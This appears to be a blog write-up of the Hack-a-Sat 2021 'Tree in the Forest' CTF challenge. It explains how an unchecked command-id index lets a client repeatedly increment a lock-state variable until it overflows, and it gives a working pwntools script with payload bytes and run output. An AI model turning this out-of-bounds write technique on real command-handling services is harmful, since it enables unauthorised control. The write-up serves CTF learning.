# Hack-a-Sat 2021

[Hack-a-Sat](https://www.hackasat.com/) is a hardcore CTF focused on Satellite Hacking, which is awesome!

![Logo](img/logo.png)

I didn't had much time to work on it, but it's way over my paygrade anyway. Most of the CTF is about binary hacking on various plataforms.

I started 2 hours before the finish of the CTF, trying to make a point in any challenge. Didn't make it... FOR 7 MINUTES (locally)! :rage:

It was fun anyway, and I got the flag because the admins were nice enough to make challenges available for a few days so I could go back and validate the solution in the real challenge.

### Format

For most of the games, you get a ticket and have to validate the ticket on a tcp connection. In some other challenges (like this) you also had to make a second connection to really go to the challenge.

Because of this, pwntools (or similar) is a requirement in this CTF.

## Challenge: Tree in the Forest

This was an beginner-level pwn challenge, but since I'm a n00b here, it was fun enough.

We receive a C source-code to analyze:

Gist:
https://gist.github.com/24e8c9b262933cb5e77b48d8f403ef80.git

### Summary
- Sets the "state" to **LOCKED**
- Initializes the command-log (array)
- Sets the timeout value for the application to stop
    - I changed here to 600 seconds (originally 60)
- Start the UDP Socket Server on port 3333 (not sure if I changed the port)
- Reads the "command_header" which is a format defined in the application. It represents the command itself.
- Save it to buffer (important for the solution)
- Log the message in the command log (key to solution)
- Handle the message
- Send the answer to the client
- Read the next command (loop)

## Analyzing the target

The **handle_message** function is the final target to get the flag:

```C
const char* handle_message(command_header* header){
	command_id_type id = header->id;
	// Based on the current state, do something for each command
	switch(lock_state){
		case UNLOCKED:
			if (id == COMMAND_GETKEYS)
				return std::getenv("FLAG");
			else
				return "Command Success: UNLOCKED";
		default:
			if (id == COMMAND_GETKEYS)
				return "Command Failed: LOCKED";
			else
				return "Command Success: LOCKED";
	}

	// Forward command to antenna
}
```

The real FLAG comes from the ENV of the server, but it shows the flag in the following conditions:
- The lock_state must be **UNLOCKED**
- The id of the command_header must be **COMMAND_GETKEYS**

The lock_state is a struct with only the obvious options:

```C
typedef enum lock_states {
	UNLOCKED = 			0,
	LOCKED = 			1,
} lock_states;

// Ignoring some lines

// Globals used in this program, used to store command log and locked/unlocked state
unsigned int lock_state;
```

It starts with 1 (No Linkin Park refs here). Looks like we have to, somehow, change this lock_state to 0, to win this round. There is no command to change it, off-course :(

## Finding the hole

To send commands, we need to understand the command_header format:

```C
typedef struct command_header{
	short version : 16;
	short type : 16;
	command_id_type id : 32;
} command_header;
```

We have to send this as a binary buffer to the server to process. While it has 9 commands, we see by the handle_message code that they are useless for this challenge purposes, so let's ignore the values for now.

As I said before, it logs the command execute. For doing this, it increases that specific command id number of executions:

```C
// Globals used in this program, used to store command log and locked/unlocked state
// ...
char command_log[COMMAND_LIST_LENGTH];
// ...

// Log the message in the command log
command_log[header->id]++;
```

This is a vulnerable code, since we control the **header->id** value just sent. Although the array contains only the 9 command indexes, the server does not filter the boundaries and we can send any index we want changing heap values along the way.

We have a particular interest on the lock_stage value. For now, we don't know the address of the lock_state relative to the command_log but... the code already gives us a clue (I changed a bit):
```C
fprintf(stderr, "Address of lock_state:  %p\n", &lock_state);
fprintf(stderr, "Value of lock_state: %u\n", *((unsigned int*)(&lock_state)));
// ...
fprintf(stderr, "Address of command_log: %p\n", &command_log);
```

If you just run it sometimes, you get the pattern:

```python
$ ./parser 
Address of lock_state:  0x55a79d971030
Address of command_log: 0x55a79d971038
Trying to bind to socket.
Bound to socket.
^C
$ ./parser 
Address of lock_state:  0x55bd2032c030
Address of command_log: 0x55bd2032c038
Trying to bind to socket.
Bound to socket.
^C
$ ./parser 
Address of lock_state:  0x55dc778e7030
Address of command_log: 0x55dc778e7038
Trying to bind to socket.
Bound to socket.
^C
```

**The address of the lock_state variable is 8-bytes before the command_log**. If we use the command_header->id with -8, we can change the lock_state value!!

But, repeating our vulnerability here, we can only increase the value by 1 (e.g: 1 to 2), not decrease it:

```C
// Log the message in the command log
command_log[header->id]++;
```

OK, but... there is another known aspect of C programs we can explore: integer overflows! If we keep increasing this value, it will eventually go back to zero, our desired state.

## Finding the right payload

When talking about structs, I don't really know the memory formats in details and C types may surprise me. To avoid wasting time, I built a separate program to generate the command_header buffer, copying all structs as is.

Since I know the target for a change is 8 bytes before, I only changed the command_id_type for including negatives:

```C
typedef enum command_id_type {
	COMMAND_ADCS_ON = 		0,
	COMMAND_ADCS_OFF =		1,
	COMMAND_CNDH_ON =		2,
	COMMAND_CNDH_OFF =		3,
	COMMAND_SPM =			4,
	COMMAND_EPM =			5,
	COMMAND_RCM =			6,
	COMMAND_DCM =			7,
	COMMAND_TTEST =			-8,
	COMMAND_GETKEYS =		9, // only allowed in unlocked state
} command_id_type;
```

And now I can generate files with the struct filled:

```C
// command_header
newid = COMMAND_TTEST;
cmd = {12, 13, newid};
f = fopen("command_header.bin", "w");
printf("%p", f);
fwrite(&cmd, sizeof(command_header), 1, f);
fclose(f);

// flag!
newid = COMMAND_GETKEYS;
cmd = {12, 13, newid};
f = fopen("get_flag.bin", "w");
printf("%p", f);
fwrite(&cmd, sizeof(command_header), 1, f);
fclose(f);
```

And now we have a struct ready to send with the payload:

```
$ hexdump -C command_header.bin 
00000000  0c 00 0d 00 f8 ff ff ff     |........|
```

The second payload is the ID COMMAND_GETKEYS, which returns the flag (if we manage to break the lock_state).

I also added a line to output the current value of the lock_state (in the server) on each request, to validate our attack.

```C
fprintf(stderr, "Value of lock_state: %u\n", lock_state);
```

Too much theory... let's go for some action.

## Initial Proof of Concept

To keep the binary format and buffers close to the server, I compiled with g++. My version is a little different from the server (which I got from the Makefile), but there was no issues.

```bash
$ g++-9 parser.c -o parser
$ export FLAG=flag{Gotcha} ## Local FLAG
$ ./parser 
Value of lock_state: 1
Address of lock_state:  0x5618ebf9c030
Address of command_log: 0x5618ebf9c038
Trying to bind to socket.
Bound to socket.
```

It's alive! But to test the payload, we need a friend: pwntools. Let's create a code to simply connect (poc.py), send the payload one time and show the result.

```Python
from pwn import *

payload_minus_8 = '\x0c\x00\x0d\x00\xf8\xff\xff\xff'
ip_addr = "localhost"
udp_port = 3333

r = remote(ip_addr, int(udp_port), typ='udp')
r.send(payload_minus_8)
log.info(r.recvline())
log.info(r.recvline())
```

And let's run:

```bash
$ python poc.py 
[+] Opening connection to localhost on port 3333: Done
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Closed connection to localhost port 3333
```

OK! It understood our payload. The "Command Success: LOCKED" shows the server status of the lock_state.
Let's see the server output:

```bash
$ ./parser 
Value of lock_state: 1 ## STARTING VALUE
Address of lock_state:  0x555b8a153030
Address of command_log: 0x555b8a153038
Trying to bind to socket.
Bound to socket.

Value of lock_state: 2 ## CHANGED!
```

Nice! We managed to change the lock_state value, originally "1".

Let's restart the server and send the same payload 5 times.

```Python
for i in range(5):
    r.send(payload_minus_8)
    log.info(r.recvline())
    log.info(r.recvline())
```

Output:
```bash
$ python poc.py 
[+] Opening connection to localhost on port 3333: Done
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Closed connection to localhost port 3333
```
And in the server:

```bash
$ ./parser 
Value of lock_state: 1
Address of lock_state:  0x560146838030
Address of command_log: 0x560146838038
Trying to bind to socket.
Bound to socket.
Value of lock_state: 2 ## Lets
Value of lock_state: 3 ## Get
Value of lock_state: 4 ## This
Value of lock_state: 5 ## Bastard
Value of lock_state: 6 ## Flag!!
```

## Pwning the Bastard

So... let's make it 255 times for fun and profit:

```bash
$ python poc.py 
[+] Opening connection to localhost on port 3333: Done
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
...
*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: UNLOCKED ## Take a look!!
[*] Closed connection to localhost port 3333
```

Yeah! We unlocked the state! We just need to get the flag now, adding the COMMAND_GETKEYS id (9).

```Python
from pwn import *

payload_minus_8 = '\x0c\x00\x0d\x00\xf8\xff\xff\xff'
payload_get_flag = '\x0c\x00\x0d\x00\x09\x00\x00\x00'
ip_addr = "localhost"
udp_port = 3333

r = remote(ip_addr, int(udp_port), typ='udp')

for i in range(255):
    r.send(payload_minus_8)
    log.info(r.recvline())
    log.info(r.recvline())

r.send(payload_get_flag) # Final Payload!
log.info(r.recvline()) # Command Ack
log.info("Please be the Flag ==> {}".format(r.recvline().decode('utf-8')))

r.close()
```

```Bash
$ python poc.py 
[+] Opening connection to localhost on port 3333: Done
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: LOCKED
...
[*] Command header acknowledge: version:12 type:13 id:-8
[*] Command Success: UNLOCKED
[*] Command header acknowledge: version:12 type:13 id:9
[*] Please be the Flag ==> flag{Gotcha}
[*] Closed connection to localhost port 3333
```

And, in the original challenge:

```Bash
flag{juliet648137sierra2:GMKztC_pG2FaurEgSJIGJRhFXLBnZUMViU_2QsHRsze6Gh12pr3stjgG0MfLRsrMT6RWYbhiJZ8WJDLDCKzSIlM}
```

# References
* CTF Time Event: https://ctftime.org/event/1365
* Repo with the artifacts discussed here: https://github.com/Neptunians/hack-a-sat
* Team: [FireShell](https://fireshellsecurity.team/)
* Twitter: [@NeptunianHacks](twitter.com/NeptunianHacks)
